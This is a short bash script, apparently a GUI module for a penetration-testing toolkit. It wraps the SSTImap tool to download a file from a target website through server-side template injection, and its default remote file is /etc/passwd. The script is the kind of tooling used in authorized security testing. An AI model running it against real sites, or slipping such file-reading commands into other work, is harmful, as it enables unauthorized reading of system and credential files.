#!/bin/bash

: '
SSTImap - download file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website")
REMOTE_FILE_FIELD=$(form_item "remote file" "remote_file" "/etc/passwd")
LOCAL_FILE_FIELD=$(form_item "local file" "local_file" "./passwd")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${REMOTE_FILE_FIELD}" "${LOCAL_FILE_FIELD}"

WEBSITE=${form_data["website"]}
REMOTE_FILE=${form_data["remote_file"]}
LOCAL_FILE=${form_data["local_file"]}

execute_command "sstimap -u '${WEBSITE}' -D '${REMOTE_FILE}' '${LOCAL_FILE}'"
create_new_line
